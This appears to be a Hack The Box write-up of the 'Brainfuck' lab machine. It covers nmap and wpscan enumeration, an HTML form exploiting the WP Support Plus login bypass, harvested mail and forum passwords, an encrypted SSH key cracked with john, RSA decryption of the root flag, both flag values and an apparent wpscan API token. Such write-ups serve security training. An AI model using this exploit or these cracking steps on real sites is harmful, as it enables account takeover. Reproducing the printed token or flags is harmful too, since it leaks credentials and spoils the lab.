{"title":"HTB - Brainfuck","slug":"Brainfuck","html":"<h1 id=\"brainfuck---10101017\">Brainfuck - 10.10.10.17</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -p- -T4 -oA nmap/quick 10.10.10.17</code></pre><pre class=\"language-bash\"><code class=\"language-bash\"># Nmap 7.91 scan initiated Fri Apr 23 09:17:23 2021 as: nmap -p- -T4 -oA nmap/quick 10.10.10.17\nNmap scan report for www.brainfuck.htb (10.10.10.17)\nHost is up (0.24s latency).\nNot shown: 65530 filtered ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n110/tcp open  pop3\n143/tcp open  imap\n443/tcp open  https\n\n# Nmap done at Fri Apr 23 09:21:49 2021 -- 1 IP address (1 host up) scanned in 265.59 seconds</code></pre><h2 id=\"website\">Website</h2>\n<h3 id=\"https10101017\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.17\">https://10.10.10.17</a></h3>\n<p><img src=\"Brainfuck.assets/image-20210423092517149.png\" alt=\"\"></p>\n<h3 id=\"ssl-cert\">SSL Cert</h3>\n<p><img src=\"brainfuck.assets/image-20210423092213672.png\" alt=\"\"></p>\n<p>user : <strong><a target=\"_blank\" rel=\"nofollow\" href=\"mailto:orestis@brainfuck.htb\">orestis@brainfuck.htb</a></strong></p>\n<p>DNS Name: <strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.brainfuck.htb\">www.brainfuck.htb</a>, sup3rs3cr3t.brainfuck.htb</strong></p>\n<p>The dns names are added to <strong>/etc/hosts</strong></p>\n<p><img src=\"brainfuck.assets/image-20210423092844295.png\" alt=\"\"></p>\n<h3 id=\"sup3rs3cr3tbrainfuckhtb\">sup3rs3cr3t.brainfuck.htb</h3>\n<p>sup3rs3cr3t.brainfuck.htb is a forum webpage.</p>\n<p><img src=\"brainfuck.assets/image-20210423100437959.png\" alt=\"\"></p>\n<h3 id=\"wwwbrainfuckhtb---brainfuckhtb\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.brainfuck.htb\">www.brainfuck.htb</a> -&gt; brainfuck.htb</h3>\n<p><strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.brainfuck.htb\">www.brainfuck.htb</a></strong> redirects to <strong>brainfuck.htb</strong> which is a <em>wordpress</em> website.</p>\n<p><img src=\"brainfuck.assets/image-20210423100221583.png\" alt=\"\"></p>\n<p><strong>wpscan</strong> is ran against the <strong><a target=\"_blank\" rel=\"nofollow\" href=\"https://brainfuck.htb\">https://brainfuck.htb</a></strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">wpscan --api-token \"zwHNCijstkXlttJouhoslFZG0MYms5Bvks9FMVexaAs\" --url \"https://brainfuck.htb\" --disable-tls-checks -o wpscan.log</code></pre><p><img src=\"brainfuck.assets/image-20210423104733666.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit WP Support Plus</code></pre><p><img src=\"brainfuck.assets/image-20210423120100898.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">wpscan --url \"https://brainfuck.htb\" --disable-tls-checks --enumerate u -o wpscan_enumerate_user.log </code></pre><p><img src=\"brainfuck.assets/image-20210423104514064.png\" alt=\"\"></p>\n<p>Users found:</p>\n<ul>\n<li>admin</li>\n<li>administrator</li>\n</ul>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h2 id=\"brainfuckhtb\">brainfuck.htb</h2>\n<h3 id=\"searchploit\">Searchploit</h3>\n<p>During enumeration, it was found that the <strong>WP Support Plus</strong> plugin is vulnerable to a <strong>Privilege Escalation</strong> attack.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit WP Support Plus </code></pre><p><img src=\"brainfuck.assets/image-20210424055551012.png\" alt=\"\"></p>\n<pre class=\"language-\"><code class=\"language-\">searchsploit -x php/webapps/41006.txt </code></pre><p><img src=\"brainfuck.assets/image-20210424060023915.png\" alt=\"\"></p>\n<h3 id=\"privilege-escalation-to-admin-on-wordpress\">Privilege Escalation to admin on wordpress</h3>\n<p>Using the users enumerated from wpscan, this attack can be performed.\nThe payload was modified as show below.</p>\n<p><img src=\"brainfuck.assets/image-20210424063910309.png\" alt=\"\"></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://brainfuck.htb/wp-admin/admin-ajax.php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        Username: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>admin<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>email<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>orestis@brainfuck.htb<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>action<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>loginGuestFacebook<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Login<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></code></pre><p>The file is hosted using the command below.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">python3 -m http.server 80</code></pre><p><img src=\"brainfuck.assets/image-20210424063117997.png\" alt=\"\"></p>\n<p>it is then viewed using a browser.</p>\n<p><img src=\"brainfuck.assets/image-20210424063217601.png\" alt=\"\"></p>\n<p><strong>Vulnerability Explanation:</strong></p>\n<p>When inspecting the traffic in Burpsuite, it can be concluded that the WP Support Plus plugin sets an authenticated cookie to the user without the need of a password.</p>\n<p><img src=\"brainfuck.assets/image-20210424064212334.png\" alt=\"\"></p>\n<p><img src=\"brainfuck.assets/image-20210424064603321.png\" alt=\"\"></p>\n<p>Once the script is ran, when refreshing the wordpress site, the cookies take effect and, the attacker is automatically authenticated.</p>\n<p><img src=\"brainfuck.assets/image-20210424064609386.png\" alt=\"\"></p>\n<h3 id=\"smtp-credentials-leaked\">SMTP Credentials leaked</h3>\n<p>Going to the <strong>Easy WP SMTP</strong> plugin, information about the user can be found.</p>\n<p><img src=\"brainfuck.assets/image-20210424065221953.png\" alt=\"\"></p>\n<p>In developers console, the password can be seen in cleartext.</p>\n<p><img src=\"brainfuck.assets/image-20210424065348596.png\" alt=\"\"></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>swpsmtp_smtp_password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>kHGuERB29DNiNE<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></code></pre><p>SMTP Credential: </p>\n<p><strong>orestis:kHGuERB29DNiNE</strong></p>\n<h3 id=\"evolution-mail-client\">Evolution Mail Client</h3>\n<p>Evolution mail client is configured as shown below to see user orestis mails.</p>\n<p><img src=\"brainfuck.assets/image-20210424070158690.png\" alt=\"\"></p>\n<p><img src=\"brainfuck.assets/image-20210424070425913.png\" alt=\"\"></p>\n<p><img src=\"brainfuck.assets/image-20210424070431548.png\" alt=\"\"></p>\n<p><img src=\"brainfuck.assets/image-20210424070507569.png\" alt=\"\"></p>\n<p>After configuring evolution, user orestis mail can be viewed.</p>\n<p><img src=\"brainfuck.assets/image-20210424070539798.png\" alt=\"\"></p>\n<p>New credentials are revealed, it is for the forum found on the subdomain <strong>sup3rs3cr3t.brainfuck.htb</strong> </p>\n<p><img src=\"brainfuck.assets/image-20210424070838384.png\" alt=\"\"></p>\n<pre class=\"language-\"><code class=\"language-\">Hi there, your credentials for our \"secret\" forum are below :)\n\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n\nRegards</code></pre><h2 id=\"sup3rs3cr3tbrainfuckhtb-1\">sup3rs3cr3t.brainfuck.htb</h2>\n<p>Using the above credentials, the user orestic can now be accessed on the forum <strong>sup3rs3cr3t.brainfuck.htb</strong>.</p>\n<p>There are 3 topics listed in the forum:</p>\n<ul>\n<li>Key</li>\n<li>SSH Access</li>\n<li>Development</li>\n</ul>\n<p><img src=\"brainfuck.assets/image-20210424071528025.png\" alt=\"\"></p>\n<p>It can be observed that user orestis always signs with the phrase <em>Orestis - Hacking for fun and profit</em> on topic <strong>SSH Access</strong>.</p>\n<p><img src=\"brainfuck.assets/image-20210424072018596.png\" alt=\"\"></p>\n<p>However on topic <strong>Key</strong>, the page is encrypted. But the same pattern can be seen as orestis always signs his posts with the same phrase <em>Orestis - Hacking for fun and profit</em>.</p>\n<p><img src=\"brainfuck.assets/image-20210424072421469.png\" alt=\"\"> </p>\n<h3 id=\"decryption-of-the-posts\">Decryption of the posts</h3>\n<p>After researching the encryption method, it was concluded that it is a one time pad encryption technique also known as Vernam Cipher (One Time Pad Vigenere).</p>\n<p>Using the website <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.boxentriq.com/code-breaking/one-time-pad\">https://www.boxentriq.com/code-breaking/one-time-pad</a>, the key was found to be <strong>BRAINFUCKMYBRAINFUCKMYBRAINFU</strong></p>\n<p><img src=\"brainfuck.assets/image-20210424073446093.png\" alt=\"\"></p>\n<p>The same result can be crossed check on the website <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.dcode.fr/vernam-cipher-vigenere\">https://www.dcode.fr/vernam-cipher-vigenere</a></p>\n<p><img src=\"brainfuck.assets/image-20210424073724663.png\" alt=\"\"></p>\n<p>When decrypting what appeared to be a link <a target=\"_blank\" rel=\"nofollow\" href=\"mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr\">mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr</a> with the pad <strong>FUCKMYBRAINFUCKMYBRAINFUCKMYBR</strong>, it resulted to reveal a link to the user orestis ssh public key <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa\">https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</a></p>\n<p><img src=\"brainfuck.assets/image-20210424074619202.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl -sk https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -o orestis.enc \ncat orestis.enc </code></pre><p>The ssh key is an encrypted key and it needs to be decrypted in order to ssh as the orestis user.</p>\n<p><img src=\"brainfuck.assets/image-20210424081016859.png\" alt=\"\"></p>\n<pre class=\"language-\"><code class=\"language-\">-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382\n\nmneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/\nB2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi\nW1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ\n7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ\nzxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum\noz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem\ndLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+\nFvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT\nmcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs\nLSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq\nul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59\nkrKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V\ngdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA\nVwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn\nschqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt\nUX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn\nF7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M\nwZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab\nIql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy\nIQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF\nmxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP\nCvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF\n9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS\nEBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi\n6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ\n-----END RSA PRIVATE KEY-----</code></pre><p>The password is cracked using john.</p>\n<pre class=\"language-powershell\"><code class=\"language-powershell\"># cracked on windows\npython ./run/ssh2john.py ./hashes/brainfuck-orestis.enc.txt | Out-File ./hashes/brainfuck-orestis.txt\n\n# if having error: Error: UTF-16 BOM seen in input file.\n# open ./hashes/brainfuck-orestis.txt in sublime and save with encoding utf-8\n\n./run/john.exe --wordlist=\"D:/Documents/Bug Bounty/SecLists/Passwords/Leaked-Databases/rockyou.txt\" ./hashes/brainfuck-orestis.txt</code></pre><p><img src=\"brainfuck.assets/image-20210424083739076.png\" alt=\"\"></p>\n<pre class=\"language-\"><code class=\"language-\">3poulakia!       (.\\hashes\\brainfuck-orestis.enc.txt)</code></pre><p>SSH credential:</p>\n<p><strong>orestis:3poulakia!</strong></p>\n<h3 id=\"ssh-as-orestis\">SSH as orestis</h3>\n<p>Using the password <strong>3poulakia!</strong>, brainfuck.htb can be access as the user orestis.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">chmod 600 orestis.enc \nssh -i orestis.enc orestis@brainfuck.htb </code></pre><p><img src=\"brainfuck.assets/image-20210424084309613.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<p>User.txt can be found in the home directory of orestis.</p>\n<p><img src=\"brainfuck.assets/image-20210424084553996.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt: 2c11cfbc5b959f73ac15a3310bd097c9</p>\n</blockquote>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>There are some uncommon files which are only readable by orestis</p>\n<ul>\n<li>encrypt.sage</li>\n<li>debug.txt</li>\n<li>output.txt </li>\n</ul>\n<p><img src=\"brainfuck.assets/image-20210424084857346.png\" alt=\"\"></p>\n<p>The file <strong>encrypt.sage</strong> is a python script which looks to be doing an RSA cipher on /root/root.txt</p>\n<p><img src=\"brainfuck.assets/image-20210424085249183.png\" alt=\"\"> </p>\n<p><strong>encrypt.sage</strong>:</p>\n<pre class=\"language-python\"><code class=\"language-python\">nbits = 1024\n\npassword = open(\"/root/root.txt\").read().strip()\nenc_pass = open(\"output.txt\",\"w\")\ndebug = open(\"debug.txt\",\"w\")\nm = Integer(int(password.encode('hex'),16))\n\np = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)\nq = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)\nn = p*q\nphi = (p-1)*(q-1)\ne = ZZ.random_element(phi)\nwhile gcd(e, phi) != 1:\n    e = ZZ.random_element(phi)\n\n\n\nc = pow(m, e, n)\nenc_pass.write('Encrypted Password: '+str(c)+'\\n')\ndebug.write(str(p)+'\\n')\ndebug.write(str(q)+'\\n')\ndebug.write(str(e)+'\\n')</code></pre><p><strong>output.txt</strong> contains <strong>c</strong>, and <strong>debug.txt</strong> contains <strong>p</strong>,<strong>q</strong> and <strong>e</strong> respectively.</p>\n<p><img src=\"brainfuck.assets/image-20210424105245632.png\" alt=\"\"></p>\n<p>The content of <strong>/root/root.txt</strong> can be easily decrypted given all the above information.</p>\n<p>Using the website <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.dcode.fr/rsa-cipher\">https://www.dcode.fr/rsa-cipher</a>, the original content of <strong>/root/root.txt</strong> can be obtained.</p>\n<p><img src=\"brainfuck.assets/image-20210424090253551.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt: 6efc1a5dbb8904751ce6566a305bb8ef</p>\n</blockquote>\n","date":"2021-04-24","excerpt":"","printDate":"April 24, 2021","printReadingTime":"5 min read"}